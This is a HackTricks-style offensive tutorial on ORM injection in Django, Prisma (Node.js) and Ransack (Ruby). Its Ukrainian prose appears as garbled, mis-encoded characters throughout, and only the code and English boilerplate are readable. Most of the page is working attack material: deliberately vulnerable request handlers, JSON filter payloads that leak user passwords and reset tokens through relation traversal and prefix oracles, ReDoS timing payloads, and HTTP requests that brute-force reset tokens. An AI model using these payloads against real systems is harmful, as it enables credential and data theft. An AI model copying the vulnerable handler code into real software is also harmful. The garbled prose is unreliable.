# ORM Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Django ORM (Python)

–í [**—Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://www.elttam.com/blog/plormbing-your-django-orm/) –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è, —è–∫ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ Django ORM –≤—Ä–∞–∑–ª–∏–≤–∏–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∫–æ–¥ –Ω–∞ –∫—à—Ç–∞–ª—Ç:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
–î–µ—è–∫–∏–π –±–∞–∑–æ–≤–∏–π API –ø–µ—Ä–µ–≥–ª—è–¥, –¥–æ —è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å –∑–∞–ø–∏—Ç–∏ –¥–ª—è
–ø–æ—à—É–∫—É —Å—Ç–∞—Ç–µ–π
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ –≤—Å—ñ request.data (—è–∫—ñ –±—É–¥—É—Ç—å —É —Ñ–æ—Ä–º–∞—Ç—ñ json) –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è –¥–ª—è **—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –æ–±'—î–∫—Ç—ñ–≤ –∑ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö**. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω—ñ —Ñ—ñ–ª—å—Ç—Ä–∏, —â–æ–± –≤–∏—Ç—è–≥—Ç–∏ –±—ñ–ª—å—à–µ –¥–∞–Ω–∏—Ö, –Ω—ñ–∂ –æ—á—ñ–∫—É–≤–∞–ª–æ—Å—è.

–ü—Ä–∏–∫–ª–∞–¥–∏:

* **–õ–æ–≥—ñ–Ω:** –£ –ø—Ä–æ—Å—Ç–æ–º—É –ª–æ–≥—ñ–Ω—ñ —Å–ø—Ä–æ–±—É–π—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –ø–∞—Ä–æ–ª—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–∏—Ö —É —Å–∏—Å—Ç–µ–º—ñ.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
–ú–æ–∂–ª–∏–≤–æ –∑–¥—ñ–π—Å–Ω–∏—Ç–∏ –±—Ä—É—Ç—Ñ–æ—Ä—Å –ø–∞—Ä–æ–ª—è, –ø–æ–∫–∏ –≤—ñ–Ω –Ω–µ –±—É–¥–µ –≤–∏—Ç—ñ–∫–∞—Ç–∏.
{% endhint %}

* **–†–µ–ª—è—Ü—ñ–π–Ω–µ —Ñ—ñ–ª—å—Ç—Ä—É–≤–∞–Ω–Ω—è**: –ú–æ–∂–ª–∏–≤–æ –ø—Ä–æ—Ö–æ–¥–∏—Ç–∏ —á–µ—Ä–µ–∑ –≤—ñ–¥–Ω–æ—Å–∏–Ω–∏, —â–æ–± –≤–∏—Ç—ñ–∫–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑ –∫–æ–ª–æ–Ω–æ–∫, —è–∫—ñ –Ω–∞–≤—ñ—Ç—å –Ω–µ –æ—á—ñ–∫—É–≤–∞–ª–∏—Å—è –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤ –æ–ø–µ—Ä–∞—Ü—ñ—ó. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —Å—Ç–∞—Ç—Ç—ñ, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º –∑ —Ü–∏–º–∏ –≤—ñ–¥–Ω–æ—Å–∏–Ω–∞–º–∏: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
–ú–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ –ø–∞—Ä–æ–ª—å —É—Å—ñ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ —Å—Ç–≤–æ—Ä–∏–ª–∏ —Å—Ç–∞—Ç—Ç—é
{% endhint %}

* **–§—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –±–∞–≥–∞—Ç–æ-–¥–æ-–±–∞–≥–∞—Ç–æ**: –£ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –º–∏ –Ω–µ –∑–º–æ–≥–ª–∏ –∑–Ω–∞–π—Ç–∏ –ø–∞—Ä–æ–ª—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ –Ω–µ —Å—Ç–≤–æ—Ä–∏–ª–∏ —Å—Ç–∞—Ç—Ç—é. –û–¥–Ω–∞–∫, —Å–ª—ñ–¥—É—é—á–∏ —ñ–Ω—à–∏–º –∑–≤'—è–∑–∫–∞–º, —Ü–µ –º–æ–∂–ª–∏–≤–æ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ –º–æ–∂–µ–º–æ –∑–Ω–∞–π—Ç–∏ –≤—Å—ñ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —É –≤—ñ–¥–¥—ñ–ª–∞—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ —Å—Ç–≤–æ—Ä–∏–ª–∏ —Å—Ç–∞—Ç—Ç—ñ, –∞ –ø–æ—Ç—ñ–º –≤–∏—Ç—ñ–∫–∞—Ç–∏ —ó—Ö –ø–∞—Ä–æ–ª—ñ (—É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É json –º–∏ –ø—Ä–æ—Å—Ç–æ –≤–∏—Ç—ñ–∫–∞—î–º–æ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∞–ª–µ –ø–æ—Ç—ñ–º –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ).
{% endhint %}

* **–ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –±–∞–≥–∞—Ç–æ—Å—Ç–æ—Ä–æ–Ω–Ω—ñ–º–∏ –≤—ñ–¥–Ω–æ—Å–∏–Ω–∞–º–∏ –º—ñ–∂ –≥—Ä—É–ø–∞–º–∏ —Ç–∞ –ø—Ä–∞–≤–∞–º–∏ Django –∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏**: –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –º–æ–¥–µ–ª—å AbstractUser –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —É Django, —ñ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ü—è –º–æ–¥–µ–ª—å –º–∞—î –¥–µ—è–∫—ñ **–±–∞–≥–∞—Ç–æ—Å—Ç–æ—Ä–æ–Ω–Ω—ñ –≤—ñ–¥–Ω–æ—Å–∏–Ω–∏ –∑ —Ç–∞–±–ª–∏—Ü—è–º–∏ Permission —Ç–∞ Group**. –¶–µ, –ø–æ —Å—É—Ç—ñ, —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π —Å–ø–æ—Å—ñ–± **–¥–æ—Å—Ç—É–ø—É –¥–æ —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ –æ–¥–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, —è–∫—â–æ –≤–æ–Ω–∏ –≤ **–æ–¥–Ω—ñ–π –≥—Ä—É–ø—ñ –∞–±–æ –º–∞—é—Ç—å –æ–¥–Ω–µ –π —Ç–µ —Å–∞–º–µ –ø—Ä–∞–≤–æ**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **–û–±—Ö—ñ–¥ –æ–±–º–µ–∂–µ–Ω—å —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó**: –¢–æ–π —Å–∞–º–∏–π –±–ª–æ–≥ –ø—Ä–æ–ø–æ–Ω—É–≤–∞–≤ –æ–±—ñ–π—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–µ—è–∫–∏—Ö —Ñ—ñ–ª—å—Ç—Ä—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ `articles = Article.objects.filter(is_secret=False, **request.data)`. –ú–æ–∂–ª–∏–≤–æ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å—Ç–∞—Ç—Ç—ñ, —è–∫—ñ –º–∞—é—Ç—å is\_secret=True, –æ—Å–∫—ñ–ª—å–∫–∏ –º–∏ –º–æ–∂–µ–º–æ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –∑ –≤—ñ–¥–Ω–æ—à–µ–Ω–Ω—è –¥–æ —Ç–∞–±–ª–∏—Ü—ñ Article —ñ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —Å–µ–∫—Ä–µ—Ç–Ω—ñ —Å—Ç–∞—Ç—Ç—ñ –∑ –Ω–µ —Å–µ–∫—Ä–µ—Ç–Ω–∏—Ö —Å—Ç–∞—Ç–µ–π, –æ—Å–∫—ñ–ª—å–∫–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏ –æ–±'—î–¥–Ω—É—é—Ç—å—Å—è, –∞ –ø–æ–ª–µ is\_secret –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –≤ –Ω–µ —Å–µ–∫—Ä–µ—Ç–Ω—ñ–π —Å—Ç–∞—Ç—Ç—ñ, —Ç–æ–¥—ñ —è–∫ –¥–∞–Ω—ñ –≤–∏—Ç—ñ–∫–∞—é—Ç—å –∑ —Å–µ–∫—Ä–µ—Ç–Ω–æ—ó —Å—Ç–∞—Ç—Ç—ñ.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
–ó–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –≤—ñ–¥–Ω–æ—Å–∏–Ω–∞–º–∏, –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ –Ω–∞–≤—ñ—Ç—å —Ñ—ñ–ª—å—Ç—Ä–∏, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É –ø–æ–∫–∞–∑–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö.
{% endhint %}

* **–ü–æ–º–∏–ª–∫–∞/–ß–∞—Å–æ–≤–∞ –æ—Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ ReDoS**: –£ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –ø—Ä–∏–∫–ª–∞–¥–∞—Ö –æ—á—ñ–∫—É–≤–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, —è–∫—â–æ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –ø—Ä–∞—Ü—é–≤–∞–ª–∞ —á–∏ –Ω—ñ, —â–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ —è–∫ –æ—Ä–∞–∫—É–ª. –ê–ª–µ –º–æ–∂–µ –±—É—Ç–∏ —Ç–∞–∫, —â–æ —è–∫–∞—Å—å –¥—ñ—è –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö, —ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –∑–∞–≤–∂–¥–∏ –æ–¥–Ω–∞–∫–æ–≤–∞. –£ —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó –º–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤–∏–º –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –Ω–æ–≤–∏–π –æ—Ä–∞–∫—É–ª.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
–í—ñ–¥ —Ç–æ–≥–æ –∂ –ø–æ—Å—Ç–∞ —â–æ–¥–æ —Ü—å–æ–≥–æ –≤–µ–∫—Ç–æ—Ä–∞:

* **SQLite**: –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–µ –º–∞—î –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ regexp (–ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å—Ç–æ—Ä–æ–Ω–Ω—î —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è)
* **PostgreSQL**: –ù–µ –º–∞—î —Ç–∞–π–º-–∞—É—Ç—É regex –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —ñ –º–µ–Ω—à —Å—Ö–∏–ª—å–Ω–∏–π –¥–æ –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ –ø—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è
* **MariaDB**: –ù–µ –º–∞—î —Ç–∞–π–º-–∞—É—Ç—É regex

## Prisma ORM (NodeJS)

–ù–∞—Å—Ç—É–ø–Ω—ñ [**—Ç—Ä—é–∫–∏ –≤–∏—Ç—è–≥–Ω—É—Ç—ñ –∑ —Ü—å–æ–≥–æ –ø–æ—Å—Ç–∞**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **–ü–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –ø–æ—à—É–∫—É**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–∞—î –ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —É—Å—ñ–º–∞ –æ–ø—Ü—ñ—è–º–∏ prisma
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

–ú–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ –≤—Å–µ —Ç—ñ–ª–æ javascript –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è –¥–æ prisma –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤.

–£ –ø—Ä–∏–∫–ª–∞–¥—ñ –∑ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –ø–æ—Å—Ç–∞ —Ü–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç—å –≤—Å—ñ –ø–æ—Å—Ç–∏, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∫–∏–º–æ—Å—å (–∫–æ–∂–µ–Ω –ø–æ—Å—Ç —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –∫–∏–º–æ—Å—å), –ø–æ–≤–µ—Ä—Ç–∞—é—á–∏ —Ç–∞–∫–æ–∂ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ü—å–æ–≥–æ –∫–æ–≥–æ—Å—å (—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –ø–∞—Ä–æ–ª—å...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
–ù–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç –≤–∏–±–∏—Ä–∞—î –≤—Å—ñ –ø–æ—Å—Ç–∏, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∫–∏–º–æ—Å—å –∑ –ø–∞—Ä–æ–ª–µ–º, —ñ –ø–æ–≤–µ—Ä—Ç–∞—î –ø–∞—Ä–æ–ª—å:
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **–ü–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —É–º–æ–≤–æ—é where**:

–î–∞–≤–∞–π—Ç–µ —Ä–æ–∑–≥–ª—è–Ω–µ–º–æ —Ü–µ, –¥–µ –∞—Ç–∞–∫–∞ –º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ `where` —É–º–æ–≤—É:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // –í—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ ORM Leak
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

–ú–æ–∂–ª–∏–≤–æ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ —Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ–ø–µ—Ä–∞—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ `startsWith`, –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.&#x20;
{% endhint %}

* **–û–±—Ö—ñ–¥ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –≤ —Ä–µ–ª—è—Ü—ñ–π–Ω–∏—Ö –∑–≤'—è–∑–∫–∞—Ö –±–∞–≥–∞—Ç–æ-–¥–æ-–±–∞–≥–∞—Ç–æ:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
–ú–æ–∂–ª–∏–≤–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –Ω–µ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω—ñ —Å—Ç–∞—Ç—Ç—ñ, –ø–æ–≤–µ—Ä—Ç–∞—é—á–∏—Å—å –¥–æ –±–∞–≥–∞—Ç–æ—Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö –≤—ñ–¥–Ω–æ—Å–∏–Ω –º—ñ–∂ `Category` -\[\*..\*]-> `Article`:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—è–≥—Ç–∏ –≤—Å—ñ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –¥–µ—è–∫–∏–º–∏ –∑–≤–æ—Ä–æ—Ç–Ω–∏–º–∏ –±–∞–≥–∞—Ç–æ—Å—Ç–æ—Ä–æ–Ω–Ω—ñ–º–∏ –∑–≤'—è–∑–∫–∞–º–∏:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **–ü–æ–º–∏–ª–∫–∏/–ó–∞–ø–∏—Ç–∏ –∑ –∑–∞—Ç—Ä–∏–º–∫–æ—é**: –£ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–º—É –ø–æ—Å—Ç—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –¥—É–∂–µ –¥–µ—Ç–∞–ª—å–Ω–∏–π –Ω–∞–±—ñ—Ä —Ç–µ—Å—Ç—ñ–≤, –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—Ö –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –æ–ø—Ç–∏–º–∞–ª—å–Ω–æ–≥–æ –∫–æ—Ä–∏—Å–Ω–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–ª—è –≤–∏—Ç–æ–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ —á–∞—Å—É. –¶–µ:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
–î–µ `{CONTAINS_LIST}` - —Ü–µ —Å–ø–∏—Å–æ–∫ –∑ 1000 —Ä—è–¥–∫—ñ–≤, —â–æ–± –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ **–≤—ñ–¥–ø–æ–≤—ñ–¥—å –∑–∞—Ç—Ä–∏–º—É—î—Ç—å—Å—è, –∫–æ–ª–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π leak –∑–Ω–∞–π–¥–µ–Ω–æ.**

## **Ransack (Ruby)**

–¶—ñ —Ç—Ä—é–∫–∏ –±—É–ª–∏ [**–∑–Ω–∞–π–¥–µ–Ω—ñ –≤ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ Ransack 4.0.0.0 —Ç–µ–ø–µ—Ä –≤–∏–º–∞–≥–∞—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —è–≤–Ω–æ–≥–æ allow list –¥–ª—è –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ —Ç–∞ –∞—Å–æ—Ü—ñ–∞—Ü—ñ–π, —è–∫—ñ –º–æ–∂–Ω–∞ —à—É–∫–∞—Ç–∏.**
{% endhint %}

**–í—Ä–∞–∑–ª–∏–≤–∏–π –ø—Ä–∏–∫–ª–∞–¥:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ –∑–∞–ø–∏—Ç –±—É–¥–µ –≤–∏–∑–Ω–∞—á–µ–Ω–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏, –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏–º–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º. –ë—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –º–µ—Ç–æ–¥–æ–º –≥—Ä—É–±–æ—ó —Å–∏–ª–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ç–æ–∫–µ–Ω —Å–∫–∏–¥–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
–ó–∞–≤–¥—è–∫–∏ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏–Ω–≥—É —Ç–∞ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–º –∑–≤'—è–∑–∫–∞–º –±—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º –≤–∏—Ç—ñ–∫–∞—Ç–∏ –±—ñ–ª—å—à–µ –¥–∞–Ω–∏—Ö –∑ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.

## References

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
